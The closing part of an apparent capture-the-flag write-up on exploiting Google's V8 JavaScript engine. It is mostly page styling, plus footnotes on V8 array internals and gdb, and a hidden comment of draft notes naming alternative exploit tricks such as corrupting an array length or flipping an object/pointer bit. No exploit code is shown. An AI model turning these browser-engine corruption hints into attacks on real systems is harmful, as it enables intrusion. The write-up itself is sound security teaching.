.jsMemVar8 { color: var(--jsMemVarF8); background: var(--jsMemVarB8) }
.jsMemVar9 { color: var(--jsMemVarF9); background: var(--jsMemVarB9) }
.jsMemVar10 { color: var(--jsMemVarF10); background: var(--jsMemVarB10) }
.jsMemVar11 { color: var(--jsMemVarF11); background: var(--jsMemVarB11) }
.jsMemVar12 { color: var(--jsMemVarF12); background: var(--jsMemVarB12) }
.jsMemVar13 { color: var(--jsMemVarF13); background: var(--jsMemVarB13) }
.jsMemVar14 { color: var(--jsMemVarF14); background: var(--jsMemVarB14) }
.jsMemVar15 { color: var(--jsMemVarF15); background: var(--jsMemVarB15) }
.jsMemVar16 { color: var(--jsMemVarF16); background: var(--jsMemVarB16) }
.jsMemVar17 { color: var(--jsMemVarF17); background: var(--jsMemVarB17) }
.jsMemVar18 { color: var(--jsMemVarF18); background: var(--jsMemVarB18) }
.jsMemVar19 { color: var(--jsMemVarF19); background: var(--jsMemVarB19) }
.jsMemVar20 { color: var(--jsMemVarF20); background: var(--jsMemVarB20) }
.jsMemVar21 { color: var(--jsMemVarF21); background: var(--jsMemVarB21) }
.jsMem:has(.jsMemVar0:hover) { --jsMemVarB0: var(--jsMemVarB); --jsMemVarF0: var(--jsMemVarF) }
.jsMem:has(.jsMemVar1:hover) { --jsMemVarB1: var(--jsMemVarB); --jsMemVarF1: var(--jsMemVarF) }
.jsMem:has(.jsMemVar2:hover) { --jsMemVarB2: var(--jsMemVarB); --jsMemVarF2: var(--jsMemVarF) }
.jsMem:has(.jsMemVar3:hover) { --jsMemVarB3: var(--jsMemVarB); --jsMemVarF3: var(--jsMemVarF) }
.jsMem:has(.jsMemVar4:hover) { --jsMemVarB4: var(--jsMemVarB); --jsMemVarF4: var(--jsMemVarF) }
.jsMem:has(.jsMemVar5:hover) { --jsMemVarB5: var(--jsMemVarB); --jsMemVarF5: var(--jsMemVarF) }
.jsMem:has(.jsMemVar6:hover) { --jsMemVarB6: var(--jsMemVarB); --jsMemVarF6: var(--jsMemVarF) }
.jsMem:has(.jsMemVar7:hover) { --jsMemVarB7: var(--jsMemVarB); --jsMemVarF7: var(--jsMemVarF) }
.jsMem:has(.jsMemVar8:hover) { --jsMemVarB8: var(--jsMemVarB); --jsMemVarF8: var(--jsMemVarF) }
.jsMem:has(.jsMemVar9:hover) { --jsMemVarB9: var(--jsMemVarB); --jsMemVarF9: var(--jsMemVarF) }
.jsMem:has(.jsMemVar10:hover) { --jsMemVarB10: var(--jsMemVarB); --jsMemVarF10: var(--jsMemVarF) }
.jsMem:has(.jsMemVar11:hover) { --jsMemVarB11: var(--jsMemVarB); --jsMemVarF11: var(--jsMemVarF) }
.jsMem:has(.jsMemVar12:hover) { --jsMemVarB12: var(--jsMemVarB); --jsMemVarF12: var(--jsMemVarF) }
.jsMem:has(.jsMemVar13:hover) { --jsMemVarB13: var(--jsMemVarB); --jsMemVarF13: var(--jsMemVarF) }
.jsMem:has(.jsMemVar14:hover) { --jsMemVarB14: var(--jsMemVarB); --jsMemVarF14: var(--jsMemVarF) }
.jsMem:has(.jsMemVar15:hover) { --jsMemVarB15: var(--jsMemVarB); --jsMemVarF15: var(--jsMemVarF) }
.jsMem:has(.jsMemVar16:hover) { --jsMemVarB16: var(--jsMemVarB); --jsMemVarF16: var(--jsMemVarF) }
.jsMem:has(.jsMemVar17:hover) { --jsMemVarB17: var(--jsMemVarB); --jsMemVarF17: var(--jsMemVarF) }
.jsMem:has(.jsMemVar18:hover) { --jsMemVarB18: var(--jsMemVarB); --jsMemVarF18: var(--jsMemVarF) }
.jsMem:has(.jsMemVar19:hover) { --jsMemVarB19: var(--jsMemVarB); --jsMemVarF19: var(--jsMemVarF) }
.jsMem:has(.jsMemVar20:hover) { --jsMemVarB20: var(--jsMemVarB); --jsMemVarF20: var(--jsMemVarF) }
.jsMem:has(.jsMemVar21:hover) { --jsMemVarB21: var(--jsMemVarB); --jsMemVarF21: var(--jsMemVarF) }

.jsMemVarExt7 { text-decoration: #0a8 underline; text-decoration-skip-ink: none; }
.jsMemVarExt8 { text-decoration: #09b underline; text-decoration-skip-ink: none; }
.jsMemVarExt11 { text-decoration: var(--jsMemVarF11) underline; }
.jsMemVarExt7:hover { background: var(--jsMemVarB7); color: var(--jsMemVarF7);	border-radius: 1px; }
.jsMemVarExt8:hover { background: var(--jsMemVarB8); color: var(--jsMemVarF8);	border-radius: 1px; }
.jsMemVarExt11:hover { background: var(--jsMemVarB11); color: var(--jsMemVarF11);	border-radius: 1px; }
body:has(.jsMemVarExt7:hover) { --jsMemVarB7: var(--jsMemVarB); --jsMemVarF7: var(--jsMemVarF) }
body:has(.jsMemVarExt8:hover) { --jsMemVarB8: var(--jsMemVarB); --jsMemVarF8: var(--jsMemVarF) }
body:has(.jsMemVarExt11:hover) { --jsMemVarB11: var(--jsMemVarB); --jsMemVarF11: var(--jsMemVarF) }
</style>

<!--

## Part x: There's better ways

args.gn has v8_enable_sandbox = false

other solutions:
 - rdjgr: change length
 - popax21: flip obj/ptr bit

--allow-natives-syntax

todo:
32bit pointer/memory compression
make sure we're in 0xa38 address space
make sure we have mobile addresses available
hex32/64 responses need to be str not num
bigint responses need to be gray not num

note: the v8/gdb highlighting thing doesn't work in the current version of ladybird because it doesn't support the :has() selector, and the little endian widget won't work due to no resizable handles

-->

[^1]: `PACKED_DOUBLE_ELEMENTS` means that the array consists of doubles only, and it also doesn't have any empty "holes". A double array with holes would be `HOLEY_DOUBLE_ELEMENTS` instead.

[^2]: [HasOnlySimpleReceiverElements](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/builtins/builtins-array.cc;l=42;drc=fe67713b2ff62f8ba290607bf7482a8efd0ca6cc) makes sure that there are no accessors on any of the elements, and that the array's prototype hasn't been modified.

[^3]: `x/8xg` stands for: e(**x**)amine (**8**) he(**x**)adecimal (**g**)iant words (64-bit values). I recommend checking out [a reference](https://visualgdb.com/gdbreference/commands/x) to see other ways this command can be used.

[^4]: In memory, the length of the array appears as twice what it really is (eg 6 instead of 3) because SMIs need to end with a 0 bit or they'll become a tagged pointer. If the length of an array was over 2<sup>31</sup>-1 we'd see a pointer to a double instead.

[^5]: JavaScript floating-point numbers can only accurately represent integers up to 2<sup>53</sup>–1. You *can* have larger numbers, but they won't be accurate. [BigInts](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/BigInt) are a separate data type that doesn't have this issue - they can be infinitely big while still being accurate! Well, perhaps not infinitely big, but [in V8](https://v8.dev/features/bigint) their size can be [over a billion bits](https://stackoverflow.com/a/70537884/2251833), which would be about 128MiB of just a single number.

[^6]: In CTF competitions, a "first blood" is the first (and often fastest) solve of a challenge.

<style>
	.challDetails {
		line-height: 12px;
		font-size: 16px;
		background: #212529;
		border: 1px solid rgba(255, 255, 255, 0.15);
		color: #dee2e6;
		font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
		border-radius: 8px;
		max-width: 500px;
		margin: 16px auto;
	}
	.challDetails *::selection {
		background: #073BA6;
	}
	.challFiles *::selection {
		background: #0F0;
		color: #000;
	}
	.challTitle {
		font-size: 24px;
		font-weight: 500;
		padding: 16px;
	}
	.challSubtitle {
		font-size: 20px;
		font-weight: 500;
		text-align: center;
		padding: 12px 0;
	}
	.challHr {
		border-bottom: 1px solid #495057;
	}
	.challTags {
		text-align: center;
		padding: 16px 16px 0 16px;
		user-select: none;
	}
	.challSection {
		padding: 0 16px 16px 16px;
	}
	.challSection code {
		overflow-wrap: break-word;
	}
	.challTag {
		border-radius: 6px;
		font-weight: bold;
		height: 32px;
		padding: 2px 6px;
		font-size: 13px;
	}
	.challFiles > ul {
		border-radius: 6px;
		background: #111;
		border: 1px solid #fff;
		line-height: 20px;
		padding: 14px;
		margin-bottom: 0;
		list-style-type: none;
		font-size: 12px;
		font-family: 'Nimbus Mono PS', 'Courier New', monospace;
	}
	.challFiles a {
		color: #0F0;
	}
	.challFiles a:hover {
		text-decoration: underline;
	}
	.challFiles > summary {
		color: #fff;
		background: #007bff;
		width: fit-content;
		padding: 12px;
		border-radius: 6px;
		user-select: none;
		cursor: pointer;
	}
	.challScores {
		width: 100%;
		border-collapse: collapse;
		background: #1c232b;
	}
	.challScores tr > * {
		border: solid 1px rgb(73, 80, 87);
		padding: 4px 8px;
		line-height: 20px;
		text-align: left;
	}
	.challScores tr > :first-child {
  		text-align:center;
  		width: 0;
	}
	.challScores tbody tr:nth-of-type(odd) {
  		background: #29313b;
	}
	.challScores tbody tr:hover {
  		background: #2b3a4d;
	}
</style>
<style>
	/* temporary */
	.highlight > pre {
		white-space: pre-wrap;
		overflow-wrap: anywhere;
	}
</style>